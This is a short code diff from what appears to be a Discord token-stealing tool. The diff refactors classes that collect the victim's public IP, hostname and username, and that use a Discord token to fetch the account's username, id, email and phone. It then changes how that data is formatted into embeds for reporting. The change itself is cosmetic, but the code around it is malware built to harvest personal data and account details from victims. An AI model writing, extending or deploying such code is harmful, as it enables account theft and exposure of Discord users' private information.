@@ -37,8 +37,8 @@ class Computer():
     IPIFY_API_URL = "https://api.ipify.org?format=json"
 
     def __init__(self):
-        api_response: dict = open_url(self.IPIFY_API_URL)
-        self.ip: Optional(str) = api_response.get("ip") if api_response else None
+        api_resp: dict = open_url(self.IPIFY_API_URL)
+        self.ip: Optional(str) = api_resp.get("ip") if api_resp else None
         self.name: str = node().split(".")[0] if node().find('.') else node()
         self.username: str = getuser()
 
@@ -103,8 +103,8 @@ class Account():
         self.account_data: dict = open_url(self.DISCORD_API_URL, self.token)
         if not self.account_data:
             return
-        self.name: str = (self.account_data["username"]
-                          + "#" + str(self.account_data["discriminator"]))
+        self.name: str = self.account_data.get("username")
+        self.discriminator = self.account_data.get("discriminator")
         self.id: str = self.account_data.get("id")
         self.email: str = self.account_data.get("email")
         self.phone: str = self.account_data.get("phone")
@@ -147,7 +147,9 @@ def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
                 }
             ],
             "author": {
-                "name": f"{account.name} ({account.id})",
+                "name": (f"{account.name}#"
+                         f"{account.discriminator} "
+                         f"({account.id})"),
                 "icon_url": account.avatar_url
             },
             "footer": {
